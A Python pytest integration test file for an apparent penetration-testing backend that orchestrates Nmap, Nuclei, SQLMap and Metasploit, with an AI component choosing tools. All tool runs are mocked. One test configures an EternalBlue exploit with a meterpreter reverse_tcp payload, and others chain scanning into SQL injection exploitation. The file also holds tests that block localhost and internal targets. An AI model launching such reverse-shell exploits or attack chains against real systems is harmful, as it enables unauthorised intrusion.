"""
SecureRedLab Backend - Integration Tests
Phase 7.6: End-to-end workflow testing

Test Coverage:
- Multi-tool workflow orchestration
- AI-driven attack chain coordination
- Real-time progress tracking
- Error handling across tools
- Performance benchmarking
- Security validation
- Data flow integrity

Author: SecureRedLab Team
Date: 2026-01-03
"""

import pytest
import asyncio
import time
from unittest.mock import Mock, patch, AsyncMock, MagicMock
from typing import Dict, Any, List

from app.execution import (
    NmapExecutor,
    MetasploitExecutor,
    SQLMapExecutor,
    NucleiExecutor,
    AIOrchestrator,
    get_ai_orchestrator
)


# Test Fixtures
@pytest.fixture
def nmap_executor():
    """Create NmapExecutor instance."""
    return NmapExecutor()


@pytest.fixture
def metasploit_executor():
    """Create MetasploitExecutor instance."""
    return MetasploitExecutor()


@pytest.fixture
def sqlmap_executor():
    """Create SQLMapExecutor instance."""
    return SQLMapExecutor()


@pytest.fixture
def nuclei_executor():
    """Create NucleiExecutor instance."""
    return NucleiExecutor()


@pytest.fixture
def ai_orchestrator():
    """Create AIOrchestrator instance."""
    return get_ai_orchestrator()


# ==================== Multi-Tool Workflow Tests ====================

class TestMultiToolWorkflow:
    """Test multi-tool workflow orchestration."""
    
    @pytest.mark.asyncio
    async def test_reconnaissance_workflow(self, nmap_executor, nuclei_executor):
        """Test reconnaissance workflow: Nmap → Nuclei."""
        # Phase 1: Nmap scan
        with patch.object(nmap_executor, '_run_container', new_callable=AsyncMock) as mock_nmap:
            mock_nmap.return_value = {
                'container_id': 'nmap-123',
                'stdout': '<?xml version="1.0"?><nmaprun><host><ports><port protocol="tcp" portid="80"><state state="open"/><service name="http"/></port></ports></host></nmaprun>',
                'stderr': '',
                'exit_code': 0
            }
            
            nmap_result = await nmap_executor.execute(
                target="192.168.1.100",
                ports="80",
                scan_type="syn"
            )
            
            assert nmap_result['status'] == 'completed'
            assert 80 in nmap_result['open_ports']
        
        # Phase 2: Nuclei scan on discovered services
        with patch.object(nuclei_executor, '_run_container', new_callable=AsyncMock) as mock_nuclei:
            mock_nuclei.return_value = {
                'container_id': 'nuclei-123',
                'stdout': '{"template-id":"CVE-2021-12345","info":{"name":"Test","severity":"high"},"matched-at":"http://192.168.1.100"}',
                'stderr': '',
                'exit_code': 0
            }
            
            nuclei_result = await nuclei_executor.execute(
                target="http://192.168.1.100"
            )
            
            assert nuclei_result['status'] == 'completed'
            assert len(nuclei_result['vulnerabilities']) > 0
    
    @pytest.mark.asyncio
    async def test_exploitation_workflow(self, nmap_executor, metasploit_executor):
        """Test exploitation workflow: Nmap → Metasploit."""
        # Phase 1: Nmap scan to identify vulnerable service
        with patch.object(nmap_executor, '_run_container', new_callable=AsyncMock) as mock_nmap:
            mock_nmap.return_value = {
                'container_id': 'nmap-123',
                'stdout': '<?xml version="1.0"?><nmaprun><host><ports><port protocol="tcp" portid="445"><state state="open"/><service name="microsoft-ds" version="SMBv1"/></port></ports></host></nmaprun>',
                'stderr': '',
                'exit_code': 0
            }
            
            nmap_result = await nmap_executor.execute(
                target="192.168.1.100",
                ports="445",
                scan_type="syn"
            )
            
            assert 445 in nmap_result['open_ports']
        
        # Phase 2: Metasploit exploitation
        with patch.object(metasploit_executor, '_start_msfrpcd', new_callable=AsyncMock), \
             patch.object(metasploit_executor, '_connect_to_msfrpcd', new_callable=AsyncMock), \
             patch.object(metasploit_executor, '_configure_exploit', new_callable=AsyncMock), \
             patch.object(metasploit_executor, '_execute_exploit', new_callable=AsyncMock) as mock_exec, \
             patch.object(metasploit_executor, '_cleanup_msfrpcd', new_callable=AsyncMock):
            
            mock_exec.return_value = {
                'success': True,
                'sessions': {'1': {'id': 1}},
                'output': 'Session created'
            }
            
            msf_result = await metasploit_executor.execute(
                target="192.168.1.100",
                module="exploit/windows/smb/ms17_010_eternalblue",
                payload="windows/x64/meterpreter/reverse_tcp",
                lhost="10.0.0.1"
            )
            
            assert msf_result['success'] is True
    
    @pytest.mark.asyncio
    async def test_web_vulnerability_workflow(self, nuclei_executor, sqlmap_executor):
        """Test web vulnerability workflow: Nuclei → SQLMap."""
        # Phase 1: Nuclei discovers SQL injection possibility
        with patch.object(nuclei_executor, '_run_container', new_callable=AsyncMock) as mock_nuclei:
            mock_nuclei.return_value = {
                'container_id': 'nuclei-123',
                'stdout': '{"template-id":"sql-injection","info":{"name":"SQL Injection","severity":"high","tags":["sqli"]},"matched-at":"http://example.com/page?id=1"}',
                'stderr': '',
                'exit_code': 0
            }
            
            nuclei_result = await nuclei_executor.execute(
                target="http://example.com",
                tags=['sqli']
            )
            
            assert any('sqli' in v['tags'] for v in nuclei_result['vulnerabilities'])
        
        # Phase 2: SQLMap confirms and exploits
        with patch.object(sqlmap_executor, '_run_container', new_callable=AsyncMock) as mock_sqlmap:
            mock_sqlmap.return_value = {
                'container_id': 'sqlmap-123',
                'stdout': '[INFO] GET parameter \'id\' is vulnerable\n[INFO] the back-end DBMS is MySQL\nback-end DBMS: MySQL 5.7.30',
                'stderr': '',
                'exit_code': 0
            }
            
            sqlmap_result = await sqlmap_executor.execute(
                target="http://example.com/page?id=1"
            )
            
            assert sqlmap_result['injectable'] is True


# ==================== AI Orchestrator Integration Tests ====================

class TestAIOrchestratorIntegration:
    """Test AI-driven multi-tool orchestration."""
    
    @pytest.mark.asyncio
    async def test_target_analysis(self, ai_orchestrator):
        """Test AI target analysis and tool selection."""
        # Mock all executors
        with patch.object(ai_orchestrator.executors['nmap'], '_run_container', new_callable=AsyncMock) as mock_nmap:
            mock_nmap.return_value = {
                'container_id': 'nmap-123',
                'stdout': '<?xml version="1.0"?><nmaprun><host><ports><port protocol="tcp" portid="80"><state state="open"/></port></ports></host></nmaprun>',
                'stderr': '',
                'exit_code': 0
            }
            
            # Test target analysis
            result = await ai_orchestrator.analyze_target("192.168.1.100")
            
            assert 'target_type' in result
            assert 'recommended_tools' in result
    
    @pytest.mark.asyncio
    async def test_reconnaissance_execution(self, ai_orchestrator):
        """Test AI-driven reconnaissance execution."""
        with patch.object(ai_orchestrator.executors['nmap'], '_run_container', new_callable=AsyncMock) as mock_nmap:
            mock_nmap.return_value = {
                'container_id': 'nmap-123',
                'stdout': '<?xml version="1.0"?><nmaprun><host><ports><port protocol="tcp" portid="80"><state state="open"/></port></ports></host></nmaprun>',
                'stderr': '',
                'exit_code': 0
            }
            
            result = await ai_orchestrator.execute_reconnaissance("192.168.1.100")
            
            assert 'scan_results' in result
            assert result['status'] == 'completed'


# ==================== Performance Benchmarking Tests ====================

class TestPerformanceBenchmarking:
    """Test performance and resource usage."""
    
    @pytest.mark.asyncio
    async def test_nmap_execution_time(self, nmap_executor):
        """Test Nmap execution time is within acceptable limits."""
        with patch.object(nmap_executor, '_run_container', new_callable=AsyncMock) as mock_run:
            mock_run.return_value = {
                'container_id': 'nmap-123',
                'stdout': '<?xml version="1.0"?><nmaprun></nmaprun>',
                'stderr': '',
                'exit_code': 0
            }
            
            start_time = time.time()
            await nmap_executor.execute(target="192.168.1.100", ports="80")
            execution_time = time.time() - start_time
            
            # Should complete within 5 seconds (with mocked container)
            assert execution_time < 5.0
    
    @pytest.mark.asyncio
    async def test_concurrent_scans(self, nmap_executor):
        """Test concurrent scan execution."""
        with patch.object(nmap_executor, '_run_container', new_callable=AsyncMock) as mock_run:
            mock_run.return_value = {
                'container_id': 'nmap-123',
                'stdout': '<?xml version="1.0"?><nmaprun></nmaprun>',
                'stderr': '',
                'exit_code': 0
            }
            
            # Execute 3 scans concurrently
            tasks = [
                nmap_executor.execute(target=f"192.168.1.{i}", ports="80")
                for i in range(1, 4)
            ]
            
            start_time = time.time()
            results = await asyncio.gather(*tasks)
            execution_time = time.time() - start_time
            
            assert len(results) == 3
            assert all(r['status'] == 'completed' for r in results)
            # Concurrent execution should be faster than sequential
            assert execution_time < 10.0


# ==================== Progress Tracking Tests ====================

class TestProgressTracking:
    """Test real-time progress tracking."""
    
    @pytest.mark.asyncio
    async def test_progress_callbacks(self, nmap_executor):
        """Test progress callback functionality."""
        progress_updates = []
        
        def progress_callback(progress: int, message: str):
            progress_updates.append({'progress': progress, 'message': message})
        
        nmap_executor.progress_callback = progress_callback
        
        with patch.object(nmap_executor, '_run_container', new_callable=AsyncMock) as mock_run:
            mock_run.return_value = {
                'container_id': 'nmap-123',
                'stdout': '<?xml version="1.0"?><nmaprun></nmaprun>',
                'stderr': '',
                'exit_code': 0
            }
            
            await nmap_executor.execute(target="192.168.1.100", ports="80")
            
            # Verify progress updates
            assert len(progress_updates) > 0
            assert progress_updates[0]['progress'] == 10
            assert progress_updates[-1]['progress'] == 100
    
    @pytest.mark.asyncio
    async def test_all_executors_progress(self):
        """Test progress tracking across all executors."""
        executors = [
            NmapExecutor(),
            MetasploitExecutor(),
            SQLMapExecutor(),
            NucleiExecutor()
        ]
        
        for executor in executors:
            progress_updates = []
            
            def progress_callback(progress: int, message: str):
                progress_updates.append(progress)
            
            executor.progress_callback = progress_callback
            
            # Mock container execution
            with patch.object(executor, '_run_container', new_callable=AsyncMock) as mock_run:
                mock_run.return_value = {
                    'container_id': 'test-123',
                    'stdout': '',
                    'stderr': '',
                    'exit_code': 0
                }
                
                try:
                    await executor.execute(target="https://example.com")
                except Exception:
                    pass  # Some executors may fail with basic params
                
                # Verify progress was reported
                if progress_updates:
                    assert min(progress_updates) >= 0
                    assert max(progress_updates) <= 100


# ==================== Error Handling Tests ====================

class TestErrorHandling:
    """Test error handling across tools."""
    
    @pytest.mark.asyncio
    async def test_nmap_container_failure_recovery(self, nmap_executor):
        """Test Nmap recovery from container failure."""
        with patch.object(nmap_executor, '_run_container', side_effect=Exception("Container failed")):
            result = await nmap_executor.execute(target="192.168.1.100", ports="80")
            
            assert result['status'] == 'failed'
            assert 'error' in result
    
    @pytest.mark.asyncio
    async def test_timeout_handling_all_tools(self):
        """Test timeout handling for all tools."""
        executors = [
            ('nmap', NmapExecutor(), {'target': '192.168.1.100', 'ports': '80'}),
            ('metasploit', MetasploitExecutor(), {'target': '192.168.1.100', 'module': 'test'}),
            ('sqlmap', SQLMapExecutor(), {'target': 'http://example.com'}),
            ('nuclei', NucleiExecutor(), {'target': 'http://example.com'})
        ]
        
        for name, executor, params in executors:
            with patch.object(executor, '_run_container', side_effect=asyncio.TimeoutError("Timeout")):
                result = await executor.execute(**params, timeout=1)
                
                assert result['status'] in ['timeout', 'failed'], f"{name} didn't handle timeout"


# ==================== Security Validation Tests ====================

class TestSecurityValidation:
    """Test security controls across all tools."""
    
    @pytest.mark.asyncio
    async def test_localhost_blocking_all_tools(self):
        """Test that localhost is blocked by all tools."""
        test_cases = [
            (NmapExecutor(), {'target': 'localhost', 'ports': '80'}),
            (MetasploitExecutor(), {'target': 'localhost', 'module': 'test'}),
            (SQLMapExecutor(), {'target': 'http://localhost'}),
            (NucleiExecutor(), {'target': 'http://localhost'})
        ]
        
        for executor, params in test_cases:
            result = await executor.execute(**params)
            assert result['status'] == 'failed', f"{executor.__class__.__name__} didn't block localhost"
    
    @pytest.mark.asyncio
    async def test_internal_ip_blocking(self):
        """Test internal IP blocking."""
        internal_ips = ['10.0.0.1', '192.168.1.1', '172.16.0.1']
        
        for ip in internal_ips:
            nuclei = NucleiExecutor()
            result = await nuclei.execute(target=f"http://{ip}")
            assert result['status'] == 'failed', f"Didn't block internal IP: {ip}"


# ==================== Data Flow Integrity Tests ====================

class TestDataFlowIntegrity:
    """Test data flow between components."""
    
    @pytest.mark.asyncio
    async def test_nmap_to_nuclei_data_flow(self, nmap_executor, nuclei_executor):
        """Test data flow from Nmap to Nuclei."""
        # Step 1: Nmap discovers services
        with patch.object(nmap_executor, '_run_container', new_callable=AsyncMock) as mock_nmap:
            mock_nmap.return_value = {
                'container_id': 'nmap-123',
                'stdout': '<?xml version="1.0"?><nmaprun><host><ports><port protocol="tcp" portid="80"><state state="open"/><service name="http"/></port></ports></host></nmaprun>',
                'stderr': '',
                'exit_code': 0
            }
            
            nmap_result = await nmap_executor.execute(target="192.168.1.100", ports="80")
            discovered_ports = nmap_result['open_ports']
        
        # Step 2: Use discovered data for Nuclei scan
        with patch.object(nuclei_executor, '_run_container', new_callable=AsyncMock) as mock_nuclei:
            mock_nuclei.return_value = {
                'container_id': 'nuclei-123',
                'stdout': '',
                'stderr': '',
                'exit_code': 0
            }
            
            # Construct target URL from Nmap results
            if 80 in discovered_ports:
                target_url = "http://192.168.1.100"
                nuclei_result = await nuclei_executor.execute(target=target_url)
                
                assert nuclei_result['target'] == target_url
                assert nuclei_result['status'] == 'completed'


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
